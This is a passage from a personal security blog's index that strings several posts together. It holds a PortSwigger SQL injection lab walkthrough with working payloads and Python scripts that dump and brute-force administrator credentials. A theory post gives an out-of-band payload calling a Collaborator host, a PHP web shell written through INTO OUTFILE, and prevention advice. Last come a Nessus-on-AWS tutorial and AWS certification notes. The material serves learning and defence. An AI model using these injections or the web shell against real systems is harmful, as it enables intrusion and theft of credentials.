NULL --, which will add to the query null fields for each column found.The query will look something like thisSELECT * FROM PRODUCTS WHERE category=&#39;Gifts&#39;UNION SELECT NULL, NULL, NULL--If the response returns a 504 error, it means that there is a syntax error, that happens because there are more columns than null fields, then you will have to add more null fields until they are equal.As you can see the objective is to return an error 200, this way we know that the number of columns in the table is equal to the number of null fields we have added.Lab 3 Python ScriptWith this script we will be automating the request to achieve sql injection, it is based on adding null values until it returns the response code 200, which means that the number of null values is equal to the number of columns in the table.import requestsimport sysimport urllib3urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)proxies = {&#39;http&#39;: &#39;http://127.0.0.1:8080&#39;, &#39;https&#39;:&#39;http://127.0.0.1:8080&#39;}def exploit_sqli(url, payload): uri=&quot;filter?category=Gifts&quot; for i in range (1,10): print(&quot;The url for request is: &quot;+url+uri+payload+&quot;--&quot;) r=requests.get(url+uri+payload+&quot;--&quot;, verify=False, proxies=proxies) if r.status_code==200: return i payload+=&quot;,+NULL&quot; return Falseif __name__==&quot;__main__&quot;: try: url = sys.argv[1].strip() payload = &quot;&#39;UNION+SELECT+NULL&quot; except IndexError: print(&#39;Usage: %s &amp;lt;url&amp;gt; &#39; % sys.argv[0]) print(&#39;Example: %s www.example-com &#39; % sys.argv[0]) sys.exit(-1) columns=exploit_sqli(url,payload) if columns: print(&quot;SQL Injection Successfull, the number of columns are {columns}&quot;.format(columns=str(columns))) else: print(&quot;Injection Failed, try again&quot;) For this case I am only testing 10 iterations, in case you are going to test too many iterations, it is recommended to create a session with the session library and attach the cookie as a parameter to make the requests more stable.Lab 4 - SQL injection UNION attack, finding a column containing textIn this lab we have to achieve the retrieve of the string ‘gIkMM7’ by the database, for this we need to know which column contains string format values, for that we make use of the tip learned in the theory section.Probe each column to test whether it can hold string data by submitting a series of UNION SELECT payloads that place a string value into each column in turnThe payload to enter would be &#39;+UNION+SELECT+NULL,&#39;gIkMM7&#39;,+NULL--.The query will look something like this:SELECT * FROM PRODUCTS WHERE category=&#39;Gifts&#39;UNION SELECT NULL, &#39;gIkMM7&#39;, NULL--As we already knew, the table has 3 columns and we should only be testing in which of these columns the format is string, in this case the second column is string format, that’s why it returns what we requestedLab 4 Python ScriptWhat this script does is to test the string given in each of the columns to know which of these accepts string format, when the response code is 200, it means that it has accepted the request, and has managed to inject sql code.import requestsimport sysimport urllib3urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)proxies = {&#39;http&#39;: &#39;http://127.0.0.1:8080&#39;, &#39;https&#39;:&#39;http://127.0.0.1:8080&#39;}def exploit_sqli(url): uri=&quot;filter?category=Gifts&quot; cols = [&quot;&#39;gIkMM7&#39;, NULL, NULL&quot;, &quot;NULL, &#39;gIkMM7&#39;, NULL&quot;, &quot;NULL, NULL, &#39;gIkMM7&#39;&quot;] for c in cols: q = f&quot;&#39; UNION SELECT {c}-- &quot; print(&quot;The url for request is: {url}&quot;.format(url=url+uri+q)) r=requests.get(url+uri+q, verify=False, proxies=proxies) if r.status_code==200: return q return Falseif __name__==&quot;__main__&quot;: try: url = sys.argv[1].strip() payload = &quot;&#39;UNION+SELECT+NULL&quot; except IndexError: print(&#39;Usage: %s &amp;lt;url&amp;gt;&#39; % sys.argv[0]) print(&#39;Example: %s www.example-com&#39; % sys.argv[0]) sys.exit(-1) columns=exploit_sqli(url) if columns: print(&quot;SQL Injection Successfull&quot;) else: print(&quot;Injection Failed, try again&quot;)In this case the table has only 3 columns and it could be done in an easy way, since there are only 3 cases to test as maximum, in the case that the table has many columns it would be better a session with the session library and not use lists, but a permutation code to be more efficient.Lab 5 - SQL injection UNION attack, retrieving data from other tablesIn this lab we only need to retrieve the administrator password found in the users table, as the description says, we will use the following payload &#39;UNION SELECT username, password FROM users-- that will allow us to extract the user and passwordThe query will look something like this:SELECT * FROM PRODUCTS WHERE category=&#39;Gifts&#39;UNION SELECT username, password FROM users--Lab 5 Python ScriptThis lab is simple, because we only have to request the username and password from the users table and it has the same format as what is shown on the web, a title and the content, if we did not have the name of these columns we would have to find it out first.import requestsimport sysimport urllib3urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)proxies = {&#39;http&#39;: &#39;http://127.0.0.1:8080&#39;, &#39;https&#39;:&#39;http://127.0.0.1:8080&#39;}def exploit_sqli(url,payload): uri=&quot;category?=Gifts&quot; print(&quot;The url for request is: {url}--&quot;.format(url=url+uri+payload)) r=requests.get(url+uri+payload+&quot;--&quot;, verify=False, proxies=proxies) if r.status_code==200: return True return Falseif __name__==&quot;__main__&quot;: try: url = sys.argv[1].strip() payload = &quot;&#39;UNION SELECT username, password FROM Users&quot; except IndexError: print(&#39;Usage: %s &amp;lt;url&amp;gt;&#39; % sys.argv[0]) print(&#39;Example: %s www.example-com&#39; % sys.argv[0]) sys.exit(-1) columns=exploit_sqli(url,payload) if columns: print(&quot;SQL Injection Successfull&quot;) else: print(&quot;Injection Failed, try again&quot;)Lab 6 - SQL injection UNION attack, retrieving multiple values in a single columnIn this lab we only have to concatenate two strings of different columns in a single column, since only one column of the table is in string format, for that we use the payload &#39;UNION SELECT NULL, username || &#39;-&#39; || password FROM users--, remember that the syntax for concatenation may vary according to the database, I leave you this table for your guidance: DB Version Syntax for string concatenation Oracle ‘foo’||‘bar’ Microsoft ‘foo’+’bar’ PostgreSQL ‘foo’||‘bar’ MySQL ‘foo’ ‘bar’ or CONCAT (‘foo’,’bar’) The query will look something like this:SELECT * FROM PRODUCTS WHERE category=&#39;Gifts&#39;UNION SELECT NULL, username ||&#39;-&#39;|| password FROM users--this is what we get back from the web, the blessed credentials.Lab 6 - Python Scriptimport requestsimport sysimport urllib3urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)proxies = {&#39;http&#39;: &#39;http://127.0.0.1:8080&#39;, &#39;https&#39;:&#39;http://127.0.0.1:8080&#39;}def exploit_sqli(url,payload): uri=&quot;category?=Gifts&quot; print(&quot;The url for request is: {url}--&quot;.format(url=url+uri+payload)) r=requests.get(url+uri+payload+&quot;--&quot;, verify=False, proxies=proxies) if r.status_code==200: return True return Falseif __name__==&quot;__main__&quot;: try: url = sys.argv[1].strip() payload = &quot;&#39;UNION SELECT username ||&#39;-&#39;|| password FROM Users&quot; except IndexError: print(&#39;Usage: %s &amp;lt;url&amp;gt;&#39; % sys.argv[0]) print(&#39;Example: %s www.example-com&#39; % sys.argv[0]) sys.exit(-1) columns=exploit_sqli(url,payload) if columns: print(&quot;SQL Injection Successfull&quot;) else: print(&quot;Injection Failed, try again&quot;)Lab 7 - SQL injection attack, querying the database type and version on OracleIn this lab, we have to find out the oracle database version, for this case first we must know how many columns the table has, in this case we can see 2 columns, since only the title and the description of the article are shown, then we use our cheat-sheet to make the corresponding query, so the payload in the URL will be: &#39;UNION SELECT &#39;VERSION&#39;, banner FROM v$version --.And the query will look something like this:SELECT * FROM PRODUCTS WHERE category=&#39;Gifts&#39;UNION SELECT &#39;VERSION&#39;, banner FROM v$version --It will retrieve the database versionLab 7 - Python ScriptWith this script we will query the web server and parse the information with the help of the bs4 library that contains BeautifulSoup to find the Oracle Database word, if it finds it we can say that the sql injection has been successful.import requestsimport sysimport urllib3from bs4 import BeautifulSoupimport reurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)proxies = {&#39;http&#39;: &#39;http://127.0.0.1:8080&#39;, &#39;https&#39;:&#39;https://127.0.0.1:8080&#39;}def exploit_sqli(url,payload): uri=&quot;category?=Lifestyle&quot; print(&quot;The url for request is: {url}--&quot;.format(url=url+uri+payload)) r=requests.get(url+uri+payload+&quot;--&quot;, verify=False, proxies=proxies) if &#39;Oracle Database&#39; in r.text: print(&quot;Found database version&quot;) parsed=BeautifulSoup(r.text,&#39;html.parser&#39;) version=parsed.find(text=re.compile(&#39;*.Oracle\\sDatabase.*&#39;)) print(f&#39;The oracle database version is {version}&#39;.format(version=version)) return True return Falseif __name__==&quot;__main__&quot;: try: url = sys.argv[1].strip() payload = &quot;&#39;UNION SELECT &#39;VERSION&#39;, banner FROM v$version&quot; except IndexError: print(&#39;Usage: %s &amp;lt;url&amp;gt;&#39; % sys.argv[0]) print(&#39;Example: %s www.example-com&#39; % sys.argv[0]) sys.exit(-1) columns=exploit_sqli(url,payload) if columns: print(&quot;SQL Injection Successfull&quot;) else: print(&quot;Injection Failed, try again&quot;)Lab 8 - SQL injection attack, querying the database type and version on MySQL and MicrosoftIn this lab we need to find out the MySQL database version, first we see how many columns the table has with the payload &#39;order by 2 by, after we find that it has 2 columns, we use the specific payload using the cheat-sheet, in this case it would be @@version, and instead of commenting with two dashes, we use #.So the query will look something like this:SELECT * FROM PRODUCTS WHERE category=&#39;Gifts&#39;UNION SELECT NULL, @@version%23We use %23 because the hashtag has to be encoded, after that the response is the database version which is 8.0.28.Lab 8 - Python ScriptIn this case the script is the same as the previous one, only the payload changes, which in this case is @@version, you can be guided by the script of lab 7.Lab 9 - SQL injection attack, listing the database contents on non-Oracle databasesIn this lab first we need the name of the tables, for that we use the parameter table_name and it will be extracted from information_schema.tables that allows us to read data about the database for more information read the Documentation, as the query accepts 2 text parameters, we use NULL in one and we get all the tables in the database.The payload in the URL look like this &#39;+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--Now, we select the table that contain the word users, in my case is users_mumqoo and dump the column names with this payload &#39;+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns WHERE table_name=&#39;users_mumqoo&#39;----In my case the column names are password_lhjzlx and username_ngcpuh.Finally we can retrieve the username and password because we know the column name and the table name, we will use this payload &#39;+UNION+SELECT+username_ngcpuh, password_lhjzlx+FROM users_mumqoo--The final query will look something like this:SELECT * FROM PRODUCTS WHERE category=&#39;Gifts&#39;UNION SELECT username_ngcpuh, password_lhjzlx FROM users_mumqoo--Lab 10 - SQL injection attack, listing the database contents on OracleIn this lab, we will use the same idea as the previous one, only now the database is oracle, so first read the Documentation about the information schema, first we must list the tables with the payload: &#39;UNION SELECT NULL, table_name FROM all_tables--After identifying the user table, which in my case is USERS_GACPLX, we must identify the names of the columns, for that we use the following payload:&#39;UNION SELECT NULL, column_name FROM USER_TAB_COLUMNS WHERE table_name=&#39;USERS_GACPLX&#39;--With this we will identify the user and password columns, in my case they are USERNAME_PIOHJJ, PASSWORD_ZELMBN , once we know that we only make the query of the credentials knowing the name of the table, with the following payload final: &#39;UNION SELECT USERNAME_PIOHJJ, PASSWORD_ZELMBN FROM USERS_GACPLX--And the final query will look something like this:SELECT * FROM PRODUCTS WHERE category=&#39;Gifts&#39;UNION SELECT USERNAME_PIOHJJ, PASSWORD_ZELMBN FROM USERS_GACPLX--Lab 11 - Blind SQL injection with conditional responsesIn this lab we have to use the cookie to make sql injection, we intercept the request with burp and we use the substring command to compare the characters of the password of the users table of the user with administrator name, this command receives 3 values, the variable, the start order and the number of characters to extract and that is equal to any letter, if the query is true then we will get the welcome back message, otherwise not, then we can make a brute force attack in burpsuite.The query will look something like this:SELECT tracking-id from tracking-table where TrackingId=&#39;g1cLmHM7hZM7IhBH&#39; and (SELECT SUBSTRING(password,1,1) FROM users WHERE username=&#39;administrator&#39;)=&#39;c&#39;--The response have the text welcome backWe use the cluster bomb attack for 2 parameters, the index of the initial position of the substring command and the character with which it is compared, for that we click on add in burpsuite and then configure the payloads for each parameter.The response have the text welcome backThe first parameter consists of indices from 1 to 20 going from 1 to 1, the length of the password is known because we previously compared the lenght of the password with different values.For example: (select password form users where username=&#39;administrator&#39; and LENGTH(password)&amp;gt;19)=&#39;administrator&#39;-- The second parameter is the character itself with which each letter of the password is compared, so it must contain the alphabet values and numbers.Then we click start attack!!If you have burpsuite community edition it will take some time because it has to make 720 requests, after finishing we order by size and relate each position with its respective letter and we will get the administrator’s password.Finally we order the position with its respective letter and we get the administrator’s passwordLab 11 - Python ScriptThis script will allow us to brute force the password, just change the session cookies for yours and it will do the job for you.import sysimport requestsimport urllib3import urlliburllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)proxies = {&#39;http&#39;: &#39;http://127.0.0.1:8080&#39;, &#39;https&#39;: &#39;https://127.0.0.1:8080&#39;}def sqli_password(url): password_extracted = &quot;&quot; for i in range(1,21): for j in range(32,126): sqli_payload = &quot;&#39; and (select ascii(substring(password,%s,1)) from users where username=&#39;administrator&#39;)=&#39;%s&#39;--&quot; % (i,j) sqli_payload_encoded = urllib.parse.quote(sqli_payload) cookies = {&#39;TrackingId&#39;: &#39;g1cLmHM7hZM7IhBH&#39; + sqli_payload_encoded, &#39;session&#39;: &#39;t8y3Fw72A2oY8vxzu3o6CyjaBnplydVD&#39;} r = requests.get(url, cookies=cookies, verify=False) if &quot;Welcome&quot; not in r.text: sys.stdout.write(&#39;\\r&#39; + password_extracted + chr(j)) sys.stdout.flush() else: password_extracted += chr(j) sys.stdout.write(&#39;\\r&#39; + password_extracted) sys.stdout.flush() breakdef main(): if len(sys.argv) != 2: print(&quot;(+) Usage: %s &amp;lt;url&amp;gt;&quot; % sys.argv[0]) print(&quot;(+) Example: %s www.example.com&quot; % sys.argv[0]) url = sys.argv[1] print(&quot;(+) Retrieving administrator password...&quot;) sqli_password(url)if __name__ == &quot;__main__&quot;: main()Lab 12 - Blind SQL injection with conditional errorsThis lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.We will use this payload TrackingId=xyz&#39;||(SELECT CASE WHEN SUBSTR(password,2,1)=&#39;§a§&#39; THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;administrator&#39;)||&#39;Continue this process testing offset 3, 4, and so on, until you have the whole password, we can use the last script but changing the sql_payload, if you have burpsuite professional it will take less time.Lab 13 - Blind SQL injection with time delaysThis lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.Modify the TrackingId cookie, changing it to:TrackingId=x&#39;||pg_sleep(10)--Submit the request and observe that the application takes 10 seconds to respond.References Web Security Academy - SQL Injection OWASP Top 10 - SQL Injection Bug Bounty Bootcamp Rana Khalil Channel" }, { "title": "SQL Injection", "url": "/posts/SQL-Injection/", "categories": "Web Security, Portswigger Academy", "tags": "web security, theory, owasp, sqli", "date": "2022-01-25 11:00:00 -0500", "snippet": "A SQL injection is an attack in which the attacker executes arbitrary SQL commands on an application’s database by supplying malicious input inserted into a SQL statement. This happens when the input used in SQL queries is incorrectly filtered or escaped and can lead to authentication bypass, sensitive data leaks, tampering of the database and RCE in some cases.In-Band (classic) SQL Injection Occurs when the attacker uses the same communication channel to both launch the attack and gather the result of the attack Retrieved data is presented directly in the web page Easier to exploit than other categories of SQLiError-Based SQLi Error bases SQLi is an in-band SQLi technique that forces the database to generate an error, giving the attacker information upon which to refine their injectionwww.random.com/app.php?id=&#39;#output#You have an error in your SQL syntax, check the manual that corresponds to your MySQL server version...Union-Based SQLi Is an in-band SQLi technique that leverages the UNION SQL operator to combine the results of two queries into a single result set Input:# retrieving data from another tablehttp://www.random.com/app.php?id=’ UNION SELECT username, password FROM users; --# update all passwords from a table with POST methodhttp://www.random.com/app.php?new_password=&quot;password12345&#39;;--&quot;query = UPDATE Users SET Password=&#39;password12345&#39;;-- WHERE Id = 2;--- The WHERE clause, which specifies the criteria of the rows that should be updated, is commented out in this query. The database would update all rows in the table, and change all of the passwords in the Users table to password12345. The attacker can now log in as anyone by using that passwordInferential (Blind) SQL Injection SQLi vuln where there is no actual transfer of data via the webapp Just as dangerous as in-band SQLi Attacker be able to reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server Takes longer to exploit than in-ban sql injectionBoolean-based SQLi Uses boolean conditions to return a different result depending on whether the query returns a TRUE or FALSE result.www.random.com/app.php?id=1select title from product where id=1#Payload 1 (false)www.random.com/app.php?id=1 and 1=2select title from product where id=1 and 1=2#Payload 2 (true)www.random.com/app.php?id=1 and 1=1select title from product where id=1 and 1=1 User table:Administrator / e3c3889ded99ej29dj9edjdje992SUBSTRING(a,b,c): function that select a part of a string a: the string, b:the first posicion, c=how many chars#Payload1www.random.com/app.php?id=1 and SUBSTRING((SELECT Password FROM Users WHERE Username =&#39;Administrator&#39;), 1, 1)=&#39;s&#39;#Queryselect title from product where id=1 and SUBSTRING((SELECT Password FROM Users Where Username=&#39;Administrator&#39;),1,1)=&#39;s&#39;#result: nothing is returned because is false#Payload 2www.random.com/app.php?id=1 and SUBSTRING((SELECT Password FROM Users Where Username=&#39;Administrator&#39;),1,1)=&#39;e&#39;#Queryselect title from product where id=1 and SUBSTRING((SELECT Password FROM Users WHERE Username=&#39;Administrator&#39;),1,1)=&#39;e&#39;#result: Returned true, the tile of product id 1 is returned bc &quot;e&quot; is the first character of the hashed passTime-based Blind SQLi Relies in the database pausing for a specified amount of time, then returning the result, indicating a success SQL query execution Ex: if the first character of the administrator’s hashed pass is an “a”, wait 10 seconds.Out-of-band (OAST) SQLi Consists of triggering an out-of-band network connection to a system that you control Not common, uses variety os protocols (DNS,HTTP) &#39;; exec master..xp_dirtree &#39;//434934839493499.burpcollabolator.net/a&#39;--Second order SQLiSecond order SQLi happens when applications user input gets stored in the database, then retrieved and used unsafely in a SQL query. For example consider an app that register an user by specifying username and password, and the user submit the following request:POST /registerHost: example.com(POST body)username=&#39;jesus&#39; UNION SELECT Username, Password FROM Users;-- &#39;&amp;amp;password=jesus123This query has a payload in the username field, later the malicious user accesses their email with the following GET request:GET /emailsHost: example.comIf the user doesn’t provide a username the app will retrieve the currently logged-in username and use it populate a SQL query:SELECT Title, Body FROM Emails WHERE Username=&#39;jesus&#39; UNION SELECT Username, Password FROM Users;--But the attacker username contains the payload, so this will return all usernames and password as email titles and bodies in the HTTP response.Exploiting the DatabaseExploiting Error-Based SQLi Submit SQL-specific characters such as ‘ or “, and look for error or other anomalies Different characters give you different errorExploiting Union-Based SQLiThere are two rules for combining the result sets of two queries by using UNION The number and order of the columns must be the same in all queries The data types must be compatibleSteps Figure out the number of columns that the query is making using ORDER BY select title, cost from product where id=1 order by 1 Incrementally inject a series of ORDER BY clauses until you get an error or observe a different behavior in the application order by 1--order by 2--order by 3-- The ORDER BY position number 3 is out of range, this means the table has only two columns Other method for determining the numbers of columns is using NULL VALUES: select title, cost from product where id=1 UNION SELECT NULL-- If not error is returned qe have to increase the NULL VALUES UNION SELECT NULL--UNION SELECT NULL, NULL -- Figure the data types of the columns (interested in string data) Probe each column to test whether it can hold string data by submitting a series of UNION SELECT payloads that place a string value into each column in turn UNION SELECT &#39;a&#39;, NULL--#Response:Conversion failed when converting the varchar value &#39;a&#39; to data type intUNION SELECT &#39;a&#39;, NULL--UNION SELECT NULL,&#39;a&#39;-- Use the UNION operator to output information from the databaseExploiting Boolean-Based Blind SQLi Submit a Boolean condition that evaluate to True/False and note the response Write a program that uses conditional statements to ask the database a series of True/False questions and monitor response Exploiting Time-Based Blind SQLi Submit a payload that pauses the application for a specified period of time Write a program that uses conditional statements to ask the database a series of True/False questions and monitor response Exploiting Out-of-Band SQLi Submit OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitor for any resulting interactions Depending on SQL injection use different methods for exfill data Escalating the Attack Learn About the Database First, we need information about the structure of the database, the payloads previously reviewed require some knowledge of the database, such as table names or field names, so we can attempt some trial-error SQL queries to determine the database version, it should look like this: SELECT Title, Body FROM Emails WHERE Username=&#39;jesus&#39; UNION SELECT 1,@@version;-- Once you know the version of database, you can extract the table names with specific commands for each database version, it should look like this: SELECT Title, Body FROM Emails WHERE Username=&#39;jesus&#39; UNION SELECT 1, table_name FROM information_schema.tables And this one will show you the columns names of the specific table: SELECT Title, Body FROM Emails WHERE Username=&#39;jesus&#39; UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name=&#39;Users&#39; Gain a Web Shell Another way to escalate SQLi is getting a web shell on the server, for example if we are attacking a php website, the following code will take the request parameter named cmd and execute it as a system command. &amp;lt;? system($_REQUEST[&#39;cmd&#39;]); ?&amp;gt; Also you can upload php code to location in the web server you can access, . For example, you can write the password of a nonexistent user and the PHP code &amp;lt;? system($_REQUEST[&#39;cmd&#39;]); ?&amp;gt; into a file located at /var/www/html/shell.php on the target server: SELECT Password FROM Users WHERE Username=&#39;abc&#39;UNION SELECT &quot;&amp;lt;? system($_REQUEST[&#39;cmd&#39;]); ?&amp;gt;&quot;INTO OUTFILE &quot;/var/www/html/shell.php&quot; Since the password will be blank because not exist, you are uploading the php script in that file, then you can simply access the file and execute any command you wish:http://www.example.com/shell.php?cmd=COMMAND How to prevent SQLi vulnerabilites? Primary Defenses: Use of Prepared Statements (Parameterized Queries) Code Vulnerable to SQLi The user supplied input customer name is embedded directly into the SQL statement The construction of the SQL statement is performed in two steps: The application specifies the query structure with placeholders for each user input The application specifies the content of each placeholder Code not vulnerable to SQLi Use of Stores Procedures Is a batch of statements grouped together and stored in the database Not always safe from SQL Injection, still need to be called in a parameterized way Whitelist Input Validation Defining what values are authorized, everything else is unauthorized Useful for values that cannot be specified as parameter placeholders, such as a table name Escaping All User Supplied Input Only used as last resort Optional Defenses: Least Privilege The application should use the lowest possible level of privileges when accessing the database Any unnecessary default functionality in the database should be removed or disabled Ensure CIS benchmark for the database in use is applied All vendor-issued security patches should be applied in a timely fashion References Web Security Academy - SQL Injection OWASP Top 10 - SQL Injection Bug Bounty Bootcamp" }, { "title": "Vulnerability Management with Nessus in AWS", "url": "/posts/Vuln-Scan-With-Nessus-in-AWS/", "categories": "AWS, Blogging", "tags": "security, lab, cloud, aws", "date": "2022-01-20 11:00:00 -0500", "snippet": "IntroductionIn this tutorial we will cover vulnerability scanning and vulnerability remediation. These are two of the main steps in the Vulnerability Management Lifecycle. We will be using Nessus Essentials to scan local VMs hosted on VMWare Workstation in order run credentialed scans to discover vulnerabilities, remediate some of the vulnerabilities.EC2 Instance Setupfirst step is launch an EC2 instance, the recommended requirements are: windows OS basic: t3 medium recommended: t3 xlargeDecrypt your password to login in a RDP session and use this to access your EC2 instanceInstalling Nessus EssentialsThen we install nessus in the windows EC2 instance, we will select 10.0.2_x64 version, use your code activation that they sent you in your account registration.When we finished installing Nessus this image will apperSetup Inbound Rules to our EC2 instanceAfter launch the ec2 and download Nessus we have to add inbound rules to our machine in order to perform a credential scanningWe are going to use this rules: https 443 ec2 ip/32 dns (tcp 53) ec2 ip/32 custom TCP 8834 ec2 ip/32 ssh(22) e2 ip/32 custom TCP 139 ec2ip/32 SMB (445) ec2ip/32 custom TCP 8835 ec2ip/32 all ICMP -IPv4 ec2ip/32 custom TCP 49152-65535 0.0.0.0/0 https(443) 0.0.0.0/0 rdp (3389) 0.0.0.0/0Then we have to give a name to our credential scan an the ip of the EC2 instanceCredential Vulnerability ScanThen select run in the dashboard of scans and wait to complete the scanInspecting First ScanAt the end we will be able to see the vulnerabilities that the host windows has, in this case it has the samba port open without authentication by password, when we click on the vulnerability it shows us more details of this one.Remediationif we visit the remediation tab it will show us the tasks we need to do to fix this vulnerability, in our case we will see that we must update Firefox, because we have a version that is very old and it contains vulnerabilities, we will also see about protecting the samba service with a password or close the port when you are not using this service that helps us to share files on the local network.After updating Firefox or uninstalling this vulnerability won´t appear in next scansNoteIf you don´t want to spend money on this lab, you also can install vmware and create a windows virtual machine, you will only need the ip of this machine to perform the scan in Nessus, is more faster and cheap, but you have to provide your own hardware.Thanks for reading, happy learning!" }, { "title": "AWS Certified Cloud Practicioner Notes", "url": "/posts/AWS-CCP-Notes/", "categories": "Cloud, Certification Notes", "tags": "aws, notes, certification", "date": "2022-01-16 11:00:00 -0500", "snippet": "Cloud computing and IAMTypes of Cloud ComputingInfrastructure as a Service (IaaS) Provide building blocks for cloud IT Provide networking, computers, data storage space Highest level of flexibility Simulate the look from managing physical resources Eg: EC2, EBS, GCP, Digital Ocean, Elastic Load BalancingPlatform as a Service (PaaS) Remove the company to manage underlying infrastructure Focus on deployment and management of applications You will define the behavior and environment for your application (code) Eg: Heroku, ECS, Elastic BeanstalkSoftware as a Service (SaaS) Completed product that is run and managed by the service provider offer services meant to be accessed by end users Eg: Gmail, Outlook, Recognition for ML, ZoomIAMUsers &amp;amp; Groups Root account shouldn´t be used or shared Users can be grouped, but not with groups, only users Users don´t have to belong a group, bout users can belong to multiple groups Users or groups can be assigned in JSON documents called policies In AWS you use the principle of least privilegePoliciesConsist of: Version: always include “2012-10-17” Id: an identifier of the policy(optional) Statements: one or more individual statements We can set password policy: uppercase letter, numbers, etc We can set a password expirationAWS CLI Commands aws configure aws iam list-users you can use aws cloud shell in few regions (1gb free)Shared Responsability Model for IAM AWS Infrastructure(global network security) Configuration and vulnerability analysis Compliance validation User Users, groups, roles, policies management and monitoring Enable MFA on all accounts Rotate all your keys often Use IAM tools to apply appropriate permissions Analyze access patterns &amp;amp; review permissions Summary Users: mapped to a physical user, has a password for aws console Groups: contains users only Policies: JSON document that outlines permissions for users or groups Roles: For EC2 instances or AWS services Security: MFA + Pass Policy AWS CLI: manage AWS using command line AWS SDK: manage AWS services using programming language Access Keys: access AWS using CLI or SDK IAM Security Tools: IAM Credential Reports(account-level) &amp;amp; IAM Access Advisor(user-level)EC2 Elastic Cloud ComputingIaaS highly configurable serviceInstance FamiliesAre different combinations of CPU, Memory, Storage and Network capacity, allows you to choose the appropriate combination of capacity to meet your requirements General Purpose Balance of compute, memory and networking resources Use-cases: web servers and code repositories Compute Optimized Ideal for high performance processor Use-cases: scientific modeling, dedicated gaming servers and server engines Memory Optimized Fast performance for workloads that process large data sets in memory Use-cases: in-memory caches, in-memory databases, real time data analysis(bi) Accelerated Computing Hardware accelerators or co-processors Use-cases: Number calculations, graphics processing, data pattern matching Storage Optimized Designed for workloads that require sequential read and write access to very large datasets on local storage Use-cases: deliver tens of thousands of low-latency, random I/O operations per second (IOPS) to applications Security Groups Security Groups are the fundamental of network security in AWS They control how traffic is allowed into or out of our EC2 instances. Security groups only contain allow rules Security area acting as firewalls on EC2 instances They regulate: Access to ports Authorized IP ranges - IPv4 and IPv6 Control of in/out bond network (from the instance to other or vice versa) Can be attached a multiple instances (M:M relation) Locked down to a region/VPC combination(if you switch to another region you have to create a new security group) Living outside the EC2, you wont see if traffic is blocked It’s good to maintain one separate security group for ssh access If your application is not accessible(time out) is because security group issue If your application gives a “connection refused” error, it’s an application error or is not launched By default all inbound traffic is blocked and all outbound traffic is authorizedEC2 Pricing ModelsOn-Demand (no upfront payment) good for low cost and flexible pay per second(windows and linux) pay per hour (other os) good for apps with short-term that can’t be interrupted good for apps that are tested for the first timeReserved (up to 75%) predictable usage commit to ec2 over 1 or 3 year term can resell your unused instances if you want to change your hardware use convertible (up to 55%)Dedicated (expensive) dedicated servers can be on-demand or reserved spot when you need isolate hardware (enterprise requirements)Spot (up to 90%) request the unused ec2 capacity apps that have flexible starts and ends Users who need large amount of extra capacity unexpected shutdownsSummary EC2 Instance: AMI(OS) + Instance Size(CPU+RAM) + Storage + Security Groups + EC2 User Data Security Groups: Firewall attached to the EC2 instance EC2 User Data: Script launched at the first start of an instance SSH: start a terminal in our EC2 via port 22 EC2 Instance Roles: link to IAM roles Purchasing Options: On-Demand, Spot, Reserved, Dedicated host(expensive)/instancesEC2 Instance StorageEBS Volume An EBS (Elastic Block Storage) Volume is a network drive you cant attach to your instances while they run EBS volumes will survive shutdowns and system crashes. That can be factor when work with sensitive data EBS volumes can be move around, mounted to other instances and converted to AMIs They can be mounted at one instance at a time and are bound to a specific availability zone Free tier: 30gb of free EBS storage (SSD or HDD) By default the root EBS volume is deleted when finish the instance By default, any other attached EBS volume is not deleted (attribute disabled) This can be controlled by the AWS console or AWS CLI Use Case: preserve root volume when instance is terminatedEBS Snapshots Make a backup of your EBS volume at a pint in time Not necessary to detach volume to do snapshot, but recommended Can copy snapshots across AZ or RegionsAMI Amazon Machine Image AMI are a customization of an EC2 instance You add your own software, configuration, os, monitoring,,, Faster boot, config time because all your software is pre-packaged AMI are built fr a specific region (and can be copied around regions) You can launch EC2 instances from AWS, your own or AWS marketplace AMIAMI Process Start an EC2 instance and customize it Stop the instance (for data integrity) Build an AMI- this will create EBS Snapshots Launch instances from other AMIsEC2 Image Builder Used to automate the creation of VMs or container images Automate the creation, maintain, validate and test EC2 AMIs Can be run on a schedule Free service (only pay for the underlying resources)EC2 Instance Store EBS volume are network drives with good bout “limited” performance If you need a high performance hardware disk, use EC2 instance store Better I/O performance EC2 Instance Store lose their storage if they are stopped (ephemeral) Good for buffer/ cache /scratch data /temporary content Risk of data loss if hardware fails, and backups are your responsibilityEFS - Elastic File System Managed NFS (network file system) can be mounted in many EC2s EFS works with linux EC2 instances in multi-AZ Scalable, expensive (2xgp2), pay per use, no capacity planningEBS vs EFSEFS Infrequent Access (EFS-IA) Storage class that is cost optimized for files that not accessed every day Up to 92% lower price than EFS standard EFS will move your files to EFS-IA based on the time of access Enable EFS-IA with a Lifecycle Policy Ex: Move files that are not accessed for 60 days Transparent to the app accessing EFSAmazon FSx for Windows File Server Fully managed, highly reliable and scalable windows native shared file system Built on Windows File Server Support SMB protocol &amp;amp; Windows NTFS Integrated with AD Can be accessed from AWS instances or on premise serverAmazon FSx for Lustre Fully managed, high performance scalable file storage for High Performance Computing (HPC) The name is derived for “linux” and “cluster” Use cases: ML, Analytics videos processing, Financial, Modeling Scales up to 100s GB/s, millions of IOPS, sub-ms latenciesSummary EBS Volumes network drives attached to one EC2, mapped in availability zones Can use EBS snapshots for backups/transfer to other AZ AMI: create ready to use EC2 instances with our customizations EC2 Image Builder: Automatically 